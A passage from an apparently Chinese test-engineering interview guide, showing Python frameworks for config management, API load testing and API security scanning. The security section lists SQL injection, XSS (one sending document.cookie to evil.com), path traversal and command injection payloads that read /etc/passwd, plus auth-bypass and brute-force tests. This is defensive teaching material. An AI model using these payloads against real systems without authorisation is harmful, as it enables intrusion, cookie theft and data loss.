        """验证环境配置"""
        config = self.get_all_config(env_name)
        return self.validator.validate(config)
    
    def compare_environments(
        self,
        env1_name: str,
        env2_name: str
    ) -> Dict:
        """比较环境配置"""
        config1 = self.get_all_config(env1_name)
        config2 = self.get_all_config(env2_name)
        
        all_keys = set(config1.keys()) | set(config2.keys())
        
        differences = []
        for key in all_keys:
            val1 = config1.get(key)
            val2 = config2.get(key)
            
            if val1 != val2:
                differences.append({
                    'key': key,
                    f'{env1_name}': val1,
                    f'{env2_name}': val2
                })
        
        return {
            'identical': len(differences) == 0,
            'differences': differences
        }

class ConfigChangeNotifier:
    """配置变更通知器"""
    
    def __init__(self):
        self.listeners: List[Callable] = []
        self.change_history: List[Dict] = []
    
    def add_listener(self, listener: Callable):
        """添加监听器"""
        self.listeners.append(listener)
    
    def remove_listener(self, listener: Callable):
        """移除监听器"""
        if listener in self.listeners:
            self.listeners.remove(listener)
    
    def notify_change(
        self,
        env_name: str,
        key: str,
        old_value: Any,
        new_value: Any
    ):
        """通知变更"""
        change = {
            'environment': env_name,
            'key': key,
            'old_value': old_value,
            'new_value': new_value,
            'timestamp': datetime.now().isoformat()
        }
        
        self.change_history.append(change)
        
        for listener in self.listeners:
            try:
                listener(change)
            except Exception as e:
                print(f"监听器执行错误: {e}")

# 使用示例
manager = EnvironmentConfigManager()

# 创建环境
manager.create_environment('base', Environment.DEVELOPMENT)
manager.create_environment('dev', Environment.DEVELOPMENT, inherits_from='base')
manager.create_environment('test', Environment.TESTING, inherits_from='base')
manager.create_environment('prod', Environment.PRODUCTION, inherits_from='base')

# 设置基础配置
manager.set_config('base', 'api.timeout', 30, description='API超时时间')
manager.set_config('base', 'db.pool_size', 10, description='数据库连接池大小')
manager.set_config('base', 'log.level', 'INFO', description='日志级别')

# 设置环境特定配置
manager.set_config('dev', 'api.base_url', 'http://localhost:8000')
manager.set_config('dev', 'db.host', 'localhost')
manager.set_config('dev', 'debug', True)

manager.set_config('test', 'api.base_url', 'http://test-api.example.com')
manager.set_config('test', 'db.host', 'test-db.example.com')
manager.set_config('test', 'debug', False)

manager.set_config('prod', 'api.base_url', 'https://api.example.com')
manager.set_config('prod', 'db.host', 'prod-db.example.com')
manager.set_config('prod', 'db.password', 'secret_password', encrypted=True)
manager.set_config('prod', 'debug', False)

# 设置验证规则
manager.validator.add_rule('api.base_url', required=True, pattern=r'^https?://.*')
manager.validator.add_rule('api.timeout', required=True, value_type=int, min=1, max=300)
manager.validator.add_rule('db.host', required=True)
manager.validator.add_rule('debug', required=True, value_type=bool)

# 验证配置
validation = manager.validate_environment('prod')
print(f"验证结果: {validation}")

# 比较环境
comparison = manager.compare_environments('dev', 'test')
print(f"环境差异: {comparison}")

# 设置当前环境并获取配置
manager.set_current_environment('test')
print(f"API URL: {manager.get('api.base_url')}")
print(f"超时时间: {manager.get('api.timeout')}")

# 保存配置
manager.save_to_file('prod', 'config/prod.yaml')
```

## 二十二、API测试进阶

### 22.1 API性能测试

**Q37: 如何设计API性能测试方案？**

**参考答案：**

首先，我会分析API性能测试的需求：
- **响应时间**：验证API响应时间是否满足要求
- **吞吐量**：验证系统处理请求的能力
- **并发能力**：验证系统并发处理能力
- **资源监控**：监控系统资源使用情况

其次，我会设计API性能测试框架：

```python
# framework/api_performance.py
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import time
import statistics
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
import json

class TestType(Enum):
    """测试类型"""
    LOAD = "load"
    STRESS = "stress"
    SPIKE = "spike"
    SOAK = "soak"
    VOLUME = "volume"

@dataclass
class RequestConfig:
    """请求配置"""
    url: str
    method: str = "GET"
    headers: Dict = field(default_factory=dict)
    params: Dict = field(default_factory=dict)
    body: Optional[Dict] = None
    timeout: int = 30

@dataclass
class ResponseMetrics:
    """响应指标"""
    status_code: int
    response_time: float
    response_size: int
    success: bool
    error_message: Optional[str] = None
    timestamp: float = field(default_factory=time.time)

@dataclass
class PerformanceResult:
    """性能测试结果"""
    test_name: str
    total_requests: int
    successful_requests: int
    failed_requests: int
    avg_response_time: float
    min_response_time: float
    max_response_time: float
    p50_response_time: float
    p90_response_time: float
    p95_response_time: float
    p99_response_time: float
    throughput: float
    error_rate: float
    duration: float
    start_time: datetime
    end_time: datetime

class RequestExecutor:
    """请求执行器"""
    
    def __init__(self, config: RequestConfig):
        self.config = config
    
    def execute(self) -> ResponseMetrics:
        """执行请求"""
        import requests
        
        start_time = time.time()
        
        try:
            response = requests.request(
                method=self.config.method,
                url=self.config.url,
                headers=self.config.headers,
                params=self.config.params,
                json=self.config.body,
                timeout=self.config.timeout
            )
            
            response_time = (time.time() - start_time) * 1000
            
            return ResponseMetrics(
                status_code=response.status_code,
                response_time=response_time,
                response_size=len(response.content),
                success=response.status_code < 400
            )
        
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return ResponseMetrics(
                status_code=0,
                response_time=response_time,
                response_size=0,
                success=False,
                error_message=str(e)
            )

class AsyncRequestExecutor:
    """异步请求执行器"""
    
    def __init__(self, config: RequestConfig):
        self.config = config
    
    async def execute(self, session: aiohttp.ClientSession) -> ResponseMetrics:
        """执行异步请求"""
        start_time = time.time()
        
        try:
            async with session.request(
                method=self.config.method,
                url=self.config.url,
                headers=self.config.headers,
                params=self.config.params,
                json=self.config.body,
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as response:
                content = await response.read()
                response_time = (time.time() - start_time) * 1000
                
                return ResponseMetrics(
                    status_code=response.status,
                    response_time=response_time,
                    response_size=len(content),
                    success=response.status < 400
                )
        
        except Exception as e:
            response_time = (time.time() - start_time) * 1000
            return ResponseMetrics(
                status_code=0,
                response_time=response_time,
                response_size=0,
                success=False,
                error_message=str(e)
            )

class LoadTestScenario:
    """负载测试场景"""
    
    def __init__(
        self,
        name: str,
        test_type: TestType,
        request_config: RequestConfig
    ):
        self.name = name
        self.test_type = test_type
        self.request_config = request_config
        self.stages: List[Dict] = []
    
    def add_stage(
        self,
        duration: int,
        users: int,
        ramp_up: int = 0
    ):
        """添加测试阶段"""
        self.stages.append({
            'duration': duration,
            'users': users,
            'ramp_up': ramp_up
        })
    
    def get_total_duration(self) -> int:
        """获取总时长"""
        return sum(stage['duration'] for stage in self.stages)

class PerformanceTestRunner:
    """性能测试运行器"""
    
    def __init__(self):
        self.results: List[ResponseMetrics] = []
        self.is_running = False
    
    def run_sync(
        self,
        scenario: LoadTestScenario,
        max_workers: int = 10
    ) -> PerformanceResult:
        """运行同步测试"""
        self.results = []
        self.is_running = True
        
        start_time = datetime.now()
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            for stage in scenario.stages:
                self._run_stage_sync(executor, stage, scenario.request_config)
        
        end_time = datetime.now()
        
        return self._calculate_result(
            scenario.name,
            start_time,
            end_time
        )
    
    def _run_stage_sync(
        self,
        executor: ThreadPoolExecutor,
        stage: Dict,
        request_config: RequestConfig
    ):
        """运行阶段"""
        duration = stage['duration']
        users = stage['users']
        ramp_up = stage.get('ramp_up', 0)
        
        if ramp_up > 0:
            ramp_up_step = users / ramp_up
            current_users = 0
            start = time.time()
            
            while time.time() - start < ramp_up:
                current_users = min(
                    int((time.time() - start) * ramp_up_step),
                    users
                )
                self._execute_requests(executor, request_config, current_users)
                time.sleep(1)
        else:
            start = time.time()
            while time.time() - start < duration:
                self._execute_requests(executor, request_config, users)
                time.sleep(1)
    
    def _execute_requests(
        self,
        executor: ThreadPoolExecutor,
        request_config: RequestConfig,
        count: int
    ):
        """执行请求"""
        executor_obj = RequestExecutor(request_config)
        futures = [executor.submit(executor_obj.execute) for _ in range(count)]
        
        for future in futures:
            try:
                result = future.result(timeout=60)
                self.results.append(result)
            except Exception as e:
                self.results.append(ResponseMetrics(
                    status_code=0,
                    response_time=0,
                    response_size=0,
                    success=False,
                    error_message=str(e)
                ))
    
    async def run_async(
        self,
        scenario: LoadTestScenario,
        max_connections: int = 100
    ) -> PerformanceResult:
        """运行异步测试"""
        self.results = []
        self.is_running = True
        
        start_time = datetime.now()
        
        connector = aiohttp.TCPConnector(limit=max_connections)
        async with aiohttp.ClientSession(connector=connector) as session:
            for stage in scenario.stages:
                await self._run_stage_async(session, stage, scenario.request_config)
        
        end_time = datetime.now()
        
        return self._calculate_result(
            scenario.name,
            start_time,
            end_time
        )
    
    async def _run_stage_async(
        self,
        session: aiohttp.ClientSession,
        stage: Dict,
        request_config: RequestConfig
    ):
        """运行异步阶段"""
        duration = stage['duration']
        users = stage['users']
        
        tasks = []
        start = time.time()
        
        while time.time() - start < duration:
            for _ in range(users):
                executor = AsyncRequestExecutor(request_config)
                tasks.append(executor.execute(session))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for result in results:
                    if isinstance(result, ResponseMetrics):
                        self.results.append(result)
                    else:
                        self.results.append(ResponseMetrics(
                            status_code=0,
                            response_time=0,
                            response_size=0,
                            success=False,
                            error_message=str(result)
                        ))
                tasks = []
            
            await asyncio.sleep(1)
    
    def _calculate_result(
        self,
        test_name: str,
        start_time: datetime,
        end_time: datetime
    ) -> PerformanceResult:
        """计算结果"""
        if not self.results:
            return PerformanceResult(
                test_name=test_name,
                total_requests=0,
                successful_requests=0,
                failed_requests=0,
                avg_response_time=0,
                min_response_time=0,
                max_response_time=0,
                p50_response_time=0,
                p90_response_time=0,
                p95_response_time=0,
                p99_response_time=0,
                throughput=0,
                error_rate=0,
                duration=0,
                start_time=start_time,
                end_time=end_time
            )
        
        response_times = [r.response_time for r in self.results]
        successful = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]
        
        duration = (end_time - start_time).total_seconds()
        
        return PerformanceResult(
            test_name=test_name,
            total_requests=len(self.results),
            successful_requests=len(successful),
            failed_requests=len(failed),
            avg_response_time=statistics.mean(response_times),
            min_response_time=min(response_times),
            max_response_time=max(response_times),
            p50_response_time=statistics.median(response_times),
            p90_response_time=self._percentile(response_times, 90),
            p95_response_time=self._percentile(response_times, 95),
            p99_response_time=self._percentile(response_times, 99),
            throughput=len(self.results) / duration if duration > 0 else 0,
            error_rate=len(failed) / len(self.results) * 100,
            duration=duration,
            start_time=start_time,
            end_time=end_time
        )
    
    def _percentile(self, data: List[float], percentile: int) -> float:
        """计算百分位数"""
        sorted_data = sorted(data)
        index = int(len(sorted_data) * percentile / 100)
        return sorted_data[min(index, len(sorted_data) - 1)]
    
    def stop(self):
        """停止测试"""
        self.is_running = False

class PerformanceReportGenerator:
    """性能报告生成器"""
    
    @staticmethod
    def generate(result: PerformanceResult) -> str:
        """生成报告"""
        report = f"""
# 性能测试报告

## 测试概要
- 测试名称: {result.test_name}
- 开始时间: {result.start_time}
- 结束时间: {result.end_time}
- 测试时长: {result.duration:.2f}秒

## 请求统计
- 总请求数: {result.total_requests}
- 成功请求: {result.successful_requests}
- 失败请求: {result.failed_requests}
- 错误率: {result.error_rate:.2f}%
- 吞吐量: {result.throughput:.2f} 请求/秒

## 响应时间
- 平均响应时间: {result.avg_response_time:.2f}ms
- 最小响应时间: {result.min_response_time:.2f}ms
- 最大响应时间: {result.max_response_time:.2f}ms
- P50响应时间: {result.p50_response_time:.2f}ms
- P90响应时间: {result.p90_response_time:.2f}ms
- P95响应时间: {result.p95_response_time:.2f}ms
- P99响应时间: {result.p99_response_time:.2f}ms

## 性能评估
"""
        
        if result.avg_response_time < 200:
            report += "- 响应时间: 优秀 (< 200ms)\n"
        elif result.avg_response_time < 500:
            report += "- 响应时间: 良好 (< 500ms)\n"
        elif result.avg_response_time < 1000:
            report += "- 响应时间: 一般 (< 1000ms)\n"
        else:
            report += "- 响应时间: 较差 (> 1000ms)\n"
        
        if result.error_rate < 1:
            report += "- 错误率: 优秀 (< 1%)\n"
        elif result.error_rate < 5:
            report += "- 错误率: 良好 (< 5%)\n"
        else:
            report += "- 错误率: 需要优化 (> 5%)\n"
        
        return report

# 使用示例
# 创建请求配置
config = RequestConfig(
    url="http://localhost:8000/api/users/",
    method="GET",
    headers={"Authorization": "Bearer token"}
)

# 创建测试场景
scenario = LoadTestScenario(
    name="用户列表API负载测试",
    test_type=TestType.LOAD,
    request_config=config
)

# 添加测试阶段
scenario.add_stage(duration=60, users=10, ramp_up=10)
scenario.add_stage(duration=120, users=50, ramp_up=30)
scenario.add_stage(duration=60, users=10)

# 运行测试
runner = PerformanceTestRunner()
result = runner.run_sync(scenario, max_workers=50)

# 生成报告
report = PerformanceReportGenerator.generate(result)
print(report)
```

### 22.2 API安全测试

**Q38: 如何设计API安全测试方案？**

**参考答案：**

首先，我会分析API安全测试的需求：
- **认证测试**：验证身份认证机制
- **授权测试**：验证权限控制
- **注入测试**：检测SQL注入、命令注入等
- **数据安全**：验证敏感数据保护

其次，我会设计API安全测试框架：

```python
# framework/api_security.py
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime
import re
import json

class VulnerabilitySeverity(Enum):
    """漏洞严重程度"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class VulnerabilityType(Enum):
    """漏洞类型"""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    AUTH_BYPASS = "auth_bypass"
    IDOR = "idor"
    BROKEN_AUTH = "broken_auth"
    SENSITIVE_DATA = "sensitive_data"
    RATE_LIMITING = "rate_limiting"
    INFO_DISCLOSURE = "info_disclosure"

@dataclass
class Vulnerability:
    """漏洞"""
    name: str
    type: VulnerabilityType
    severity: VulnerabilitySeverity
    description: str
    endpoint: str
    method: str
    payload: str
    evidence: str
    remediation: str
    references: List[str] = field(default_factory=list)

@dataclass
class SecurityTestResult:
    """安全测试结果"""
    test_name: str
    vulnerabilities: List[Vulnerability]
    passed: bool
    start_time: datetime
    end_time: datetime

class PayloadGenerator:
    """Payload生成器"""
    
    def __init__(self):
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "admin'--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1 AND 1=1",
            "1 AND 1=2",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/'+document.cookie</script>",
            "<img src=\"javascript:alert('XSS')\">",
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]
    
    def get_sql_payloads(self) -> List[str]:
        return self.sql_injection_payloads
    
    def get_xss_payloads(self) -> List[str]:
        return self.xss_payloads
    
    def get_path_traversal_payloads(self) -> List[str]:
        return self.path_traversal_payloads
    
    def get_command_injection_payloads(self) -> List[str]:
        return self.command_injection_payloads

class SQLInjectionScanner:
    """SQL注入扫描器"""
    
    def __init__(self):
        self.payload_generator = PayloadGenerator()
        self.error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySqlException",
            r"PostgreSQL.*ERROR",
            r"Warning.*pg_",
            r"ORA-\d{5}",
            r"Microsoft SQL Server",
            r"SQLite3::SQLException",
            r"Syntax error.*query",
            r"Unclosed quotation mark",
        ]
    
    def scan(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        headers: Dict = None
    ) -> List[Vulnerability]:
        """扫描SQL注入"""
        vulnerabilities = []
        
        import requests
        
        for param_name, param_value in params.items():
            for payload in self.payload_generator.get_sql_payloads():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    if method.upper() == "GET":
                        response = requests.get(
                            url,
                            params=test_params,
                            headers=headers,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            url,
                            json=test_params,
                            headers=headers,
                            timeout=10
                        )
                    
                    if self._check_sql_error(response.text):
                        vulnerabilities.append(Vulnerability(
                            name=f"SQL注入 - {param_name}",
                            type=VulnerabilityType.SQL_INJECTION,
                            severity=VulnerabilitySeverity.HIGH,
                            description=f"参数 {param_name} 存在SQL注入漏洞",
                            endpoint=url,
                            method=method,
                            payload=payload,
                            evidence=f"检测到SQL错误信息",
                            remediation="使用参数化查询，避免直接拼接SQL语句",
                            references=["OWASP SQL Injection"]
                        ))
                        break
                
                except Exception:
                    pass
        
        return vulnerabilities
    
    def _check_sql_error(self, response_text: str) -> bool:
        """检查SQL错误"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

class XSSScanner:
    """XSS扫描器"""
    
    def __init__(self):
        self.payload_generator = PayloadGenerator()
    
    def scan(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        headers: Dict = None
    ) -> List[Vulnerability]:
        """扫描XSS"""
        vulnerabilities = []
        
        import requests
        
        for param_name, param_value in params.items():
            for payload in self.payload_generator.get_xss_payloads():
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    if method.upper() == "GET":
                        response = requests.get(
                            url,
                            params=test_params,
                            headers=headers,
                            timeout=10
                        )
                    else:
                        response = requests.post(
                            url,
                            json=test_params,
                            headers=headers,
                            timeout=10
                        )
                    
                    if self._check_xss_reflection(response.text, payload):
                        vulnerabilities.append(Vulnerability(
                            name=f"XSS - {param_name}",
                            type=VulnerabilityType.XSS,
                            severity=VulnerabilitySeverity.HIGH,
                            description=f"参数 {param_name} 存在XSS漏洞",
                            endpoint=url,
                            method=method,
                            payload=payload,
                            evidence=f"Payload被反射到响应中",
                            remediation="对用户输入进行HTML编码，使用CSP策略",
                            references=["OWASP XSS"]
                        ))
                        break
                
                except Exception:
                    pass
        
        return vulnerabilities
    
    def _check_xss_reflection(self, response_text: str, payload: str) -> bool:
        """检查XSS反射"""
        return payload in response_text

class AuthTester:
    """认证测试器"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
    
    def test_auth_bypass(
        self,
        login_url: str,
        username: str,
        password: str
    ) -> List[Vulnerability]:
        """测试认证绕过"""
        vulnerabilities = []
        
        import requests
        
        bypass_attempts = [
            {"username": username, "password": password},
            {"username": username, "password": "' OR '1'='1"},
            {"username": "admin'--", "password": "anything"},
            {"username": username, "password": ""},
            {"username": "", "password": password},
        ]
        
        for attempt in bypass_attempts:
            try:
                response = requests.post(
                    f"{self.base_url}{login_url}",
                    json=attempt,
                    timeout=10
                )
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('token') or data.get('authenticated'):
                        vulnerabilities.append(Vulnerability(
                            name="认证绕过",
                            type=VulnerabilityType.AUTH_BYPASS,
                            severity=VulnerabilitySeverity.CRITICAL,
                            description="存在认证绕过漏洞",
                            endpoint=login_url,
                            method="POST",
                            payload=json.dumps(attempt),
                            evidence="使用无效凭据成功认证",
                            remediation="实施严格的认证验证逻辑",
                            references=["OWASP Broken Authentication"]
                        ))
            except Exception:
                pass
        
        return vulnerabilities
    
    def test_idor(
        self,
        resource_url: str,
        valid_token: str,
        other_user_id: int
    ) -> List[Vulnerability]:
        """测试IDOR"""
        vulnerabilities = []
        
        import requests
        
        headers = {"Authorization": f"Bearer {valid_token}"}
        
        try:
            response = requests.get(
                f"{self.base_url}{resource_url}/{other_user_id}",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                vulnerabilities.append(Vulnerability(
                    name="IDOR - 不安全的直接对象引用",
                    type=VulnerabilityType.IDOR,
                    severity=VulnerabilitySeverity.HIGH,
                    description="可以访问其他用户的资源",
                    endpoint=f"{resource_url}/{other_user_id}",
                    method="GET",
                    payload=f"User ID: {other_user_id}",
                    evidence="成功访问其他用户数据",
                    remediation="实施访问控制检查，验证用户权限",
                    references=["OWASP IDOR"]
                ))
        except Exception:
            pass
        
        return vulnerabilities
    
    def test_rate_limiting(
        self,
        login_url: str,
        username: str
    ) -> List[Vulnerability]:
        """测试速率限制"""
        vulnerabilities = []
        
        import requests
        
        attempts = 0
        blocked = False
        
        for i in range(100):
            try:
                response = requests.post(
                    f"{self.base_url}{login_url}",
                    json={"username": username, "password": f"wrong_{i}"},
                    timeout=10
                )
                attempts += 1
                
                if response.status_code == 429:
                    blocked = True
                    break
            except Exception:
                pass
        
        if not blocked and attempts >= 20:
            vulnerabilities.append(Vulnerability(
                name="缺少速率限制",
                type=VulnerabilityType.RATE_LIMITING,
                severity=VulnerabilitySeverity.MEDIUM,
                description="登录接口缺少速率限制，可能遭受暴力破解攻击",
                endpoint=login_url,
                method="POST",
                payload=f"{attempts}次失败尝试后未被阻止",
                evidence=f"尝试{attempts}次后仍未被阻止",
                remediation="实施速率限制和账户锁定策略",
                references=["OWASP Rate Limiting"]
            ))
        
        return vulnerabilities

class SensitiveDataScanner:
    """敏感数据扫描器"""
    
    def __init__(self):
        self.patterns = {
            'credit_card': r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            'ssn': r'\b\d{3}-\d{2}-\d{4}\b',
            'email': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'phone': r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b',
            'api_key': r'\b(?:api[_-]?key|apikey|token)[\s:=]+[\'"]?\w{20,}[\'"]?\b',
            'password': r'\b(?:password|passwd|pwd)[\s:=]+[\'"]?\w+[\'"]?\b',
        }
    
    def scan_response(
        self,
        url: str,
        response_text: str,
        headers: Dict
    ) -> List[Vulnerability]:
        """扫描响应中的敏感数据"""
        vulnerabilities = []
        
        for data_type, pattern in self.patterns.items():
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                vulnerabilities.append(Vulnerability(
                    name=f"敏感数据泄露 - {data_type}",
                    type=VulnerabilityType.SENSITIVE_DATA,
                    severity=VulnerabilitySeverity.HIGH,
                    description=f"响应中包含{data_type}数据",
                    endpoint=url,
                    method="RESPONSE",
                    payload=pattern,
                    evidence=f"发现{len(matches)}个匹配",
                    remediation="加密敏感数据，避免在响应中返回",
                    references=["OWASP Sensitive Data Exposure"]
                ))
        
        if not headers.get('X-Content-Type-Options'):
            vulnerabilities.append(Vulnerability(
                name="缺少安全响应头",
                type=VulnerabilityType.INFO_DISCLOSURE,
                severity=VulnerabilitySeverity.LOW,
                description="缺少X-Content-Type-Options响应头",
                endpoint=url,
                method="RESPONSE",
                payload="",
                evidence="响应头中缺少X-Content-Type-Options",
                remediation="添加X-Content-Type-Options: nosniff响应头",
                references=["OWASP Security Headers"]
            ))
        
        return vulnerabilities

class SecurityTestRunner:
    """安全测试运行器"""
    
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.sql_scanner = SQLInjectionScanner()
        self.xss_scanner = XSSScanner()
        self.auth_tester = AuthTester(base_url)
        self.data_scanner = SensitiveDataScanner()
        self.results: List[SecurityTestResult] = []
    
    def run_full_scan(
        self,
        endpoints: List[Dict],
        auth_token: str = None
    ) -> List[SecurityTestResult]:
        """运行完整扫描"""
        results = []
        
        for endpoint in endpoints:
            result = self.scan_endpoint(endpoint, auth_token)
            results.append(result)
        
        self.results.extend(results)
        return results
    
    def scan_endpoint(
        self,
        endpoint: Dict,
        auth_token: str = None
    ) -> SecurityTestResult:
        """扫描端点"""
        start_time = datetime.now()
        vulnerabilities = []
        
        url = f"{self.base_url}{endpoint['path']}"
        method = endpoint.get('method', 'GET')
        params = endpoint.get('params', {})
        headers = {}
        
        if auth_token:
            headers['Authorization'] = f"Bearer {auth_token}"
        
        vulnerabilities.extend(
            self.sql_scanner.scan(url, method, params, headers)
        )
        
        vulnerabilities.extend(
            self.xss_scanner.scan(url, method, params, headers)
        )
        
        import requests
        try:
            if method.upper() == "GET":
                response = requests.get(url, params=params, headers=headers, timeout=10)
            else:
                response = requests.request(method, url, json=params, headers=headers, timeout=10)
            
            vulnerabilities.extend(
                self.data_scanner.scan_response(url, response.text, dict(response.headers))
            )
        except Exception:
            pass
        
        end_time = datetime.now()
        
        return SecurityTestResult(
            test_name=f"安全扫描 - {endpoint['path']}",
            vulnerabilities=vulnerabilities,
            passed=len(vulnerabilities) == 0,
            start_time=start_time,
            end_time=end_time
        )
    
    def generate_report(self) -> str:
        """生成报告"""
        total_vulns = sum(len(r.vulnerabilities) for r in self.results)
        
        severity_counts = {
            VulnerabilitySeverity.CRITICAL: 0,
            VulnerabilitySeverity.HIGH: 0,
            VulnerabilitySeverity.MEDIUM: 0,
            VulnerabilitySeverity.LOW: 0,
            VulnerabilitySeverity.INFO: 0,
        }
        
        for result in self.results:
            for vuln in result.vulnerabilities:
                severity_counts[vuln.severity] += 1
        
        report = f"""
# API安全测试报告

## 概要
- 扫描端点数: {len(self.results)}
- 发现漏洞数: {total_vulns}
- 严重: {severity_counts[VulnerabilitySeverity.CRITICAL]}
- 高危: {severity_counts[VulnerabilitySeverity.HIGH]}
- 中危: {severity_counts[VulnerabilitySeverity.MEDIUM]}
- 低危: {severity_counts[VulnerabilitySeverity.LOW]}
- 信息: {severity_counts[VulnerabilitySeverity.INFO]}

## 漏洞详情
"""
        
        for result in self.results:
            if result.vulnerabilities:
                report += f"\n### {result.test_name}\n"
                for vuln in result.vulnerabilities:
                    report += f"""
#### {vuln.name}
- 严重程度: {vuln.severity.value}
- 描述: {vuln.description}
- 端点: {vuln.endpoint}
- 方法: {vuln.method}
- Payload: {vuln.payload}
- 修复建议: {vuln.remediation}
"""
        
        return report

# 使用示例
runner = SecurityTestRunner("http://localhost:8000")

# 定义要扫描的端点
endpoints = [
    {
        "path": "/api/users/",
        "method": "GET",
        "params": {"search": "test"}
    },
    {
        "path": "/api/login/",
        "method": "POST",
        "params": {"username": "admin", "password": "admin123"}
    },
    {
        "path": "/api/projects/",
        "method": "GET",
        "params": {"name": "test"}
    }
]

# 运行扫描
results = runner.run_full_scan(endpoints, auth_token="your_token")

# 生成报告
report = runner.generate_report()
print(report)
```
